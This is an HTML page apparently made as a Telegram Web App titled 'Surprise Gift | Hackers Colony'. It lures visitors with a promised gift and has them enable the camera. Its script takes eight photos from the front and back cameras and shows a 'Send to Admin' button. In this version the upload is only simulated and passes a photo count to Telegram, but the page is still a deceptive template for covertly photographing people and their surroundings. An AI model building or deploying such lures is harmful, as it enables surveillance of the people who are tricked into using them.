<!DOCTYPE html>
<html>
<head>
    <title>Surprise Gift | Hackers Colony</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #1a1a1a;
            color: white;
            text-align: center;
            padding: 20px;
        }
        .container { max-width: 500px; margin: 0 auto; }
        .card {
            background: #2a2a2a;
            border-radius: 15px;
            padding: 30px;
            margin: 20px 0;
        }
        button {
            background: #4CAF50;
            border: none;
            color: white;
            padding: 15px;
            font-size: 16px;
            border-radius: 10px;
            cursor: pointer;
            margin: 10px;
            width: 100%;
        }
        button:disabled { background: #666; }
        video {
            width: 100%;
            border-radius: 10px;
            margin: 10px 0;
        }
        .photos {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .photos img {
            width: 100%;
            border-radius: 5px;
        }
        .progress {
            background: #333;
            height: 20px;
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: #4CAF50;
            width: 0%;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ Surprise Gift Unlocker üßß</h1>
        
        <div class="card" id="welcome">
            <h2>Welcome!</h2>
            <p>Click below to start camera and capture your gift photos.</p>
            <p><small>Will capture 8 photos total (4 front + 4 back)</small></p>
            <button id="startBtn">Start Camera</button>
        </div>
        
        <div class="card hidden" id="camera">
            <h2>Camera Active</h2>
            <video id="video" autoplay></video>
            <div class="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <p id="status">Ready to capture...</p>
            <button id="captureBtn">Capture Photo</button>
        </div>
        
        <div class="card hidden" id="result">
            <h2>Photos Captured!</h2>
            <div class="photos" id="photoGrid"></div>
            <p id="message">All photos captured successfully!</p>
            <button id="sendBtn">Send to Admin</button>
        </div>
    </div>

    <script>
        // Camera variables
        let stream = null;
        let photos = [];
        let photoCount = 0;
        let currentCamera = 'user';
        
        // Elements
        const welcome = document.getElementById('welcome');
        const camera = document.getElementById('camera');
        const result = document.getElementById('result');
        const video = document.getElementById('video');
        const startBtn = document.getElementById('startBtn');
        const captureBtn = document.getElementById('captureBtn');
        const sendBtn = document.getElementById('sendBtn');
        const progressBar = document.getElementById('progressBar');
        const status = document.getElementById('status');
        const photoGrid = document.getElementById('photoGrid');
        const message = document.getElementById('message');
        
        // Start camera
        startBtn.onclick = async () => {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }
                });
                video.srcObject = stream;
                welcome.classList.add('hidden');
                camera.classList.remove('hidden');
            } catch (err) {
                alert('Camera access denied! Please allow camera.');
            }
        };
        
        // Capture photo
        captureBtn.onclick = () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            // Add to photos
            const img = document.createElement('img');
            img.src = canvas.toDataURL('image/jpeg');
            photoGrid.appendChild(img);
            
            photos.push(canvas.toDataURL('image/jpeg'));
            photoCount++;
            
            // Update progress
            const progress = (photoCount / 8) * 100;
            progressBar.style.width = `${progress}%`;
            
            if (photoCount < 4) {
                status.textContent = `Front Camera: ${photoCount}/4`;
            } else if (photoCount === 4) {
                status.textContent = 'Switching to back camera...';
                switchCamera();
            } else if (photoCount < 8) {
                status.textContent = `Back Camera: ${photoCount - 4}/4`;
            } else {
                // All photos captured
                camera.classList.add('hidden');
                result.classList.remove('hidden');
                message.textContent = '‚úÖ 8 photos captured! Ready to send.';
                
                // Stop camera
                stream.getTracks().forEach(track => track.stop());
            }
        };
        
        // Switch camera
        async function switchCamera() {
            stream.getTracks().forEach(track => track.stop());
            
            currentCamera = 'environment';
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' }
            });
            video.srcObject = stream;
            
            status.textContent = 'Back Camera: 0/4';
        }
        
        // Send photos
        sendBtn.onclick = () => {
            sendBtn.disabled = true;
            message.textContent = 'Sending photos to admin...';
            
            // Simulate sending
            setTimeout(() => {
                message.innerHTML = `
                    ‚úÖ Photos sent successfully!<br>
                    Sent to:<br>
                    1. You<br>
                    2. Admin<br><br>
                    Thank you!
                `;
                
                // Telegram Web App integration
                if (window.Telegram && Telegram.WebApp) {
                    Telegram.WebApp.sendData(JSON.stringify({
                        action: 'photos_captured',
                        count: 8
                    }));
                    
                    setTimeout(() => {
                        Telegram.WebApp.close();
                    }, 2000);
                }
            }, 3000);
        };
        
        // Telegram Web App initialization
        if (window.Telegram && Telegram.WebApp) {
            Telegram.WebApp.ready();
            Telegram.WebApp.expand();
        }
    </script>
</body>
</html>
